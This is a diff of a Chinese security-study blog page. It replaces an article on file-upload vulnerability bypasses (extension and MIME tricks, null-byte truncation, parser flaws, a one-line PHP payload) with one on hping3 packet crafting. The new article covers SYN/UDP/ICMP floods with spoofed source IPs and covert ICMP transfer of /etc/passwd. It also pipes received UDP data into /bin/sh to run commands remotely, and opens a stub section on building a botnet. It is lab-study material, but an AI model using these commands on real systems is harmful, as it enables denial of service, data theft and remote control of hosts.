@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传漏洞, Amy">
+    <meta name="keywords" content="网络发包测试, Amy">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传漏洞 | Amy</title>
+    <title>网络发包测试 | Amy</title>
     <link rel="icon" type="image/svg+xml" href="https://cdn.jsdelivr.net/gh/anwarnu/anwarnu.github.io/favicon.svg">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwarnu/anwarnu.github.io/libs/awesome/css/all.min.css">
@@ -205,12 +205,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306203157463.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210423090905088.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传漏洞</h1>
+                    <h1 class="description center-align post-title">网络发包测试</h1>
                 </div>
             </div>
         </div>
@@ -326,8 +326,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web/">
-                                <span class="chip bg-color">web</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C/">
+                                <span class="chip bg-color">网络</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85/">
+                                <span class="chip bg-color">数据包</span>
                             </a>
                         
                     </div>
@@ -338,8 +342,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                漏洞
+                            <a href="/categories/sec/" class="post-category">
+                                sec
                             </a>
                         
                     </div>
@@ -351,28 +355,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:
-                    2020-11-30
+                    2021-04-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-19
+                    2021-04-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    762
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    2 分
+                    6 分
                 </div>
                 
 
@@ -390,34 +394,111 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</p>
-<h2 id="常见文件上传检测"><a href="#常见文件上传检测" class="headerlink" title="常见文件上传检测"></a>常见文件上传检测</h2><h3 id="1-客户端js检查"><a href="#1-客户端js检查" class="headerlink" title="1.客户端js检查"></a>1.客户端js检查</h3><p>js代码中加了拓展名的黑名单限制，防止一般用户上传不被允许的文件。</p>
-<p>绕过方式：</p>
-<p>1.burpsuite抓包修改</p>
-<p>2.前端修改js代码</p>
-<p>3.禁用浏览器js</p>
-<h3 id="2-服务端检测绕过"><a href="#2-服务端检测绕过" class="headerlink" title="2.服务端检测绕过"></a>2.服务端检测绕过</h3><h4 id="MIME-类型检测"><a href="#MIME-类型检测" class="headerlink" title="MIME 类型检测"></a>MIME 类型检测</h4><p>主要是检测Content-Type: 字段</p>
-<p>就是检查Content-Type的值，MIME类型决定了某种扩展名用什么应用程序打开，GIF的MIME值为image/gif</p>
-<p>绕过方式：</p>
-<p>burp抓包修改Content-Type: 为允许的字段<br>Content-Type: image/gif<br>Content-Type: image/png<br>Content-Type: image/jpeg</p>
-<h4 id="文件拓展名检查"><a href="#文件拓展名检查" class="headerlink" title="文件拓展名检查"></a>文件拓展名检查</h4><p>与前端js后缀名检测类似，只不过是在后端进行检查，有时候还可以配合解析漏洞结合目录路径攻击，例如test.asp/test.jpg。后端后缀名检查也分两种，黑名单与白名单。</p>
-<p>黑名单检查绕过：</p>
-<ul>
-<li>文件名大小写绕过，例代码中有php规则，那么可以使用PHP或pHP绕过。</li>
-<li>黑名单列表绕过，对黑名单列表中没有的扩展名进行攻击，比如asa、cer等。</li>
-<li>利用windows和Linux系统的特性进行特殊文件名绕过，a.asp. a.asp_等。</li>
-<li>htaccess 文件攻击。</li>
-<li>配合解析漏洞(IIS、Apache等)。</li>
-</ul>
-<p>白名单绕过：</p>
-<ul>
-<li>截断攻击，比如a.asp%00.gif等。</li>
-<li>配合解析漏洞。</li>
-</ul>
-<h4 id="目录路径的检查"><a href="#目录路径的检查" class="headerlink" title="目录路径的检查"></a>目录路径的检查</h4><p>对目录路径可进行0x00截断绕过；以及可以控制目录地址，上传文件夹的参数可控)</p>
-<h4 id="检测文件内容是否包含恶意代码"><a href="#检测文件内容是否包含恶意代码" class="headerlink" title="检测文件内容是否包含恶意代码"></a>检测文件内容是否包含恶意代码</h4><p>这种方式主要检查图片文件的幻数，比如GIF的值为GIF89a，后端代码会检测改值判断是否为GIF图片文件，想要绕过只要在幻数后面加上一句话木马就行。</p>
-<h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p><strong>iis解析漏洞</strong><br>1 目录解析<br>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。<br>2 文件解析<br>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。<br>IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx<br>3 默认解析<br>.asp .aspx .ashx .asa .cer这是系统默默认的后缀名<br><strong>Apache解析漏洞</strong><br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断。比如xxx.php.rar对apache来说rar是不可解析的，所以就会解析成xxx.php</p>
-<p><strong>nginx解析漏洞</strong><br>开启cgi:SCRIPT_NAME FASTCGI:<br><a target="_blank" rel="noopener" href="http://www.xx.com/a.jpg/.php(%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6)-----%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E4%B8%BA.php%E6%96%87%E4%BB%B6">www.xx.com/a.jpg/.php(任何不存在文件)-----可以解析为.php文件</a><br>a.jpg:<?php phpinfo();?><br>a.php%00.jpg—-解析为a.php</p>
+                <h2 id="网络发包测试"><a href="#网络发包测试" class="headerlink" title="网络发包测试"></a>网络发包测试</h2><h3 id="hping发包"><a href="#hping发包" class="headerlink" title="hping发包"></a>hping发包</h3><p>hping可进行防火墙测试，DDoS ，端口扫描等功能。</p>
+<p>命令挺多的，忘记了可以用man查看下，或者查看帮助。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">  -c  --count     发送数据包的数目
+  -i  --interval  发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)
+      --fast      等同 -i u10000 (每秒10个包)
+      --faster    等同 -i u1000 (每秒100个包)
+      --flood	  尽最快发送数据包，不显示回复。
+  -n  --numeric   数字化输出，象征性输出主机地址。
+  -q  --quiet     安静模式
+  -I  --interface 网卡接口 (默认路由接口)
+  -V  --verbose   详细模式
+  -D  --debug     调试信息
+      --beep      对于接收到的每个匹配数据包蜂鸣声提示
+模式选择
+  default mode     TCP   &#x2F;&#x2F; 默认模式是 TCP
+  -0  --rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。
+  -1  --icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型&#x2F;模式的ICMP报文。
+  -2  --udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
+  -8  --scan       扫描模式 指定扫描对应的端口。
+                   Example: hping --scan 1-30,70-90 -S www.target.host    &#x2F;&#x2F; 扫描
+  -9  --listen     监听模式
+  
+IP 模式
+  -a  --spoof      源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
+  --rand-dest      随机目的地址模式。详细使用 man 命令
+  --rand-source    随机源地址模式。详细使用 man 命令
+  -t  --ttl        ttl (默认 64)  &#x2F;&#x2F;修改 ttl 值
+  -N  --id         id (默认 随机)  &#x2F;&#x2F; hping 中的 ID 值，缺省为随机值
+  -W  --winid      使用win* id字节顺序  &#x2F;&#x2F;使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
+  -r  --rel        相对id字段(估计主机流量)  &#x2F;&#x2F;更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
+  -f  --frag       拆分数据包更多的frag.  (may pass weak acl)   &#x2F;&#x2F;分段，可以测试对方或者交换机碎片处理能力，缺省16字节。
+  -x  --morefrag   设置更多的分段标志    &#x2F;&#x2F; 大量碎片，泪滴攻击。
+  -y  --dontfrag   设置不分段标志    &#x2F;&#x2F; 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
+  -g  --fragoff    set the fragment offset    &#x2F;&#x2F; 设置断偏移。
+  -m  --mtu        设置虚拟最大传输单元, implies --frag if packet size &gt; mtu    &#x2F;&#x2F; 设置虚拟MTU值，当大于mtu的时候分段。
+  -o  --tos        tos字段，缺省0x00
+  -G  --rroute     记录IP路由，并显示路由缓冲。
+  --lsrr           松散源路由并记录路由        &#x2F;&#x2F; 松散源路由
+  --ssrr           严格源路由并记录路由      &#x2F;&#x2F; 严格源路由
+  -H  --ipproto    在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。
+
+ICMP 模式
+  -C  --icmptype   icmp类型(默认echo请求)    &#x2F;&#x2F; ICMP类型，缺省回显请求。
+  -K  --icmpcode   icmp代号(默认0)     &#x2F;&#x2F; ICMP代码。
+      --force-icmp 发送所有icmp类型(默认仅发送支持的类型)    &#x2F;&#x2F; 强制ICMP类型。
+      --icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)    &#x2F;&#x2F; ICMP重定向
+      --icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)            &#x2F;&#x2F; icmp时间戳
+      --icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)  &#x2F;&#x2F; icmp子网地址
+      --icmp-help  显示其他icmp选项帮助      &#x2F;&#x2F; ICMP帮助
+
+UDP&#x2F;TCP 模式
+  -s  --baseport   base source port             (default random)              &#x2F;&#x2F; 缺省随机源端口
+  -p  --destport   [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc&#x2F;dec    &#x2F;&#x2F; 缺省随机源端口
+  -k  --keep       keep still source port      &#x2F;&#x2F; 保持源端口
+  -w  --win        winsize (default 64)        &#x2F;&#x2F; win的滑动窗口。windows发送字节(默认64)
+  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen &#x2F; 4)    &#x2F;&#x2F; 设置伪造tcp数据偏移量(取代tcp地址长度除4)
+  -Q  --seqnum     shows only tcp sequence number        &#x2F;&#x2F; 仅显示tcp序列号
+  -b  --badcksum   (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP&#x2F;TCP校验和。
+  -M  --setseq     设置TCP序列号 
+  -L  --setack     设置TCP的ack   ------------------------------------- (不是 TCP 的 ACK 标志位)
+  -F  --fin        set FIN flag
+  -S  --syn        set SYN flag
+  -R  --rst        set RST flag
+  -P  --push       set PUSH flag
+  -A  --ack        set ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）
+  -U  --urg        set URG flag      &#x2F;&#x2F; 一大堆IP抱头的设置。
+  -X  --xmas       set X unused flag (0x40)
+  -Y  --ymas       set Y unused flag (0x80)
+  --tcpexitcode    使用last tcp-&gt; th_flags作为退出码
+  --tcp-mss        启用具有给定值的TCP MSS选项
+  --tcp-timestamp  启用TCP时间戳选项来猜测HZ&#x2F;uptime
+
+Common &#x2F;&#x2F;通用设置
+  -d  --data       data size    (default is 0)    &#x2F;&#x2F; 发送数据包大小，缺省是0。
+  -E  --file       文件数据
+  -e  --sign       添加“签名”
+  -j  --dump       转储为十六进制数据包
+  -J  --print      转储为可打印字符
+  -B  --safe       启用“安全”协议
+  -u  --end        告诉你什么时候--file达到EOF并防止倒回
+  -T  --traceroute traceroute模式(等同使用 --bind 且--ttl 1)
+  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出
+  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳
+  --tr-no-rtt	   不要在跟踪路由模式下计算&#x2F;显示RTT信息 ARS包描述（新增功能，不稳定）
+ARS packet description (new, unstable)
+  --apd-send       发送APD描述数据包(参见docs &#x2F; APD.txt)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="发送syn包"><a href="#发送syn包" class="headerlink" title="发送syn包"></a>发送syn包</h4><p>设置两台在相同网段下的虚拟机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419154452206.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419154743949.png"></p>
+<p>也可以加上随机源IP参数 –rand-source这样源IP就被伪造成随机的了。但真实环境中运营商会检测地址段，不属于地址段的会被丢弃。</p>
+<h4 id="发送UDP包"><a href="#发送UDP包" class="headerlink" title="发送UDP包"></a>发送UDP包</h4><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419160313878.png" alt="端口自增从1000开始"></p>
+<h4 id="发送ICMP包"><a href="#发送ICMP包" class="headerlink" title="发送ICMP包"></a>发送ICMP包</h4><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419160658964.png" alt="伪造源IP发送ICMP数据包"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419160812432.png" alt="成功接收"></p>
+<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>发送端：<code>hping3 192.168.74.128 –icmp –sign pass -d 10000 -c 1 —file /etc/passwd</code></p>
+<p>接收端：<code>hping3 --lisetn pass 192.168.74.132 -I eth0 --icmp</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419161614372.png"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>原理还是文件传输，只是接收的时候利用了一个管道符来执行接收文件里面的内容</p>
+<p><code>echo “touch hack.txt” &gt; test.cmd</code></p>
+<p>发送：<code>hping3 192.168.74.128 -p 53 -d 100 -c 1 --udp --sign pass --file ./test.cmd</code></p>
+<p>接收：<code>hping3 192.168.74.132 --listen  pass -I eth0 --udp -p53 | /bin/sh</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419163306120.png" alt="命令执行"></p>
+<h3 id="apachebench发包"><a href="#apachebench发包" class="headerlink" title="apachebench发包"></a>apachebench发包</h3><h3 id="僵尸网络搭建"><a href="#僵尸网络搭建" class="headerlink" title="僵尸网络搭建"></a>僵尸网络搭建</h3><blockquote>
+<p>僵尸网络（botnet）是攻击者出于恶意目的，传播僵尸程序控制大量主机，并通过一对多的命令与控制信道所组成的网络</p>
+</blockquote>
 
                 
             </div>
@@ -444,7 +525,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://anwarn.com/2020/lou-dong/wen-jian-shang-chuan-lou-dong/">https://anwarn.com/2020/lou-dong/wen-jian-shang-chuan-lou-dong/</a>
+                    <a href="https://anwarn.com/2021/study/sec/">https://anwarn.com/2021/study/sec/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -482,8 +563,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web/">
-                                    <span class="chip bg-color">web</span>
+                                <a href="/tags/%E7%BD%91%E7%BB%9C/">
+                                    <span class="chip bg-color">网络</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85/">
+                                    <span class="chip bg-color">数据包</span>
                                 </a>
                             
                         </div>
@@ -526,17 +611,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/lou-dong/php-fan-xu-lie-hua/">
+                <a href="/2021/study/sec/">
                     <div class="card-image">
                         
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210423090905088.png" class="responsive-img" alt="网络发包测试">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/anwarnu.github.io/medias/featureimages/9.jpg" class="responsive-img" alt="反序列化学习">
-                        
-                        <span class="card-title">反序列化学习</span>
+                        <span class="card-title">网络发包测试</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -546,26 +631,31 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    漏洞
+                            <a href="/categories/sec/" class="post-category">
+                                    sec
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C/">
+                        <span class="chip bg-color">网络</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85/">
+                        <span class="chip bg-color">数据包</span>
                     </a>
                     
                 </div>
@@ -579,12 +669,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/ba-chang/upload-labs/">
+                <a href="/2021/other/bat-wait/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306203157463.png" class="responsive-img" alt="upload-labs">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210319181608457.png" class="responsive-img" alt="bat_wait">
                         
-                        <span class="card-title">upload-labs</span>
+                        <span class="card-title">bat_wait</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -595,14 +685,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/Others/" class="post-category">
+                                    Others
                                 </a>
                             
                             
@@ -612,8 +702,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/win/">
+                        <span class="chip bg-color">win</span>
                     </a>
                     
                 </div>
